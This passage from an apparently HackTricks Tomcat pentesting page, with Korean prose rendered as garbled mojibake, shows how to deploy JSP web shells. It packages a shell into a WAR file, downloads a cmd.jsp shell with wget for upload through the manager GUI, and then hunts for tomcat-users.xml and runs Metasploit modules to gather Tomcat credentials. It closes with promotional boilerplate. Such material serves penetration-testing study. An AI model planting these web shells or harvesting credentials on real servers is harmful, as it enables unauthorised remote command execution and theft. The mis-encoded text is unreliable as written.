}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
ë‹¤ìŒì„ ì„¤ì¹˜í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ì—…ë¡œë“œ, ë‹¤ìš´ë¡œë“œ ë° ëª…ë ¹ ì‹¤í–‰ ê°€ëŠ¥): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### ìˆ˜ë™ ë°©ë²• 2

[ì´](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)ì™€ ê°™ì€ JSP ì›¹ ì‰˜ì„ ì–»ê³  WAR íŒŒì¼ì„ ìƒì„±í•˜ì„¸ìš”:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Tomcat ìê²© ì¦ëª… íŒŒì¼ì˜ ì´ë¦„ì€ _tomcat-users.xml_ì…ë‹ˆë‹¤.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
ë‹¤ë¥¸ Tomcat ìê²© ì¦ëª…ì„ ìˆ˜ì§‘í•˜ëŠ” ë°©ë²•:
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## ë‹¤ë¥¸ í†°ìº£ ìŠ¤ìºë‹ ë„êµ¬

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## ì°¸ê³  ìë£Œ
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

ê°€ì¥ ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ì°¾ì•„ì„œ ë¹ ë¥´ê²Œ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. IntruderëŠ” ê³µê²© ëŒ€ìƒì„ ì¶”ì í•˜ê³  ì ê·¹ì ì¸ ìœ„í˜‘ ìŠ¤ìº”ì„ ì‹¤í–‰í•˜ì—¬ APIë¶€í„° ì›¹ ì•± ë° í´ë¼ìš°ë“œ ì‹œìŠ¤í…œê¹Œì§€ ì „ì²´ ê¸°ìˆ  ìŠ¤íƒì—ì„œ ë¬¸ì œë¥¼ ì°¾ìŠµë‹ˆë‹¤. [**ë¬´ë£Œë¡œ ì‹œë„í•´ë³´ì„¸ìš”**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ì˜¤ëŠ˜.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
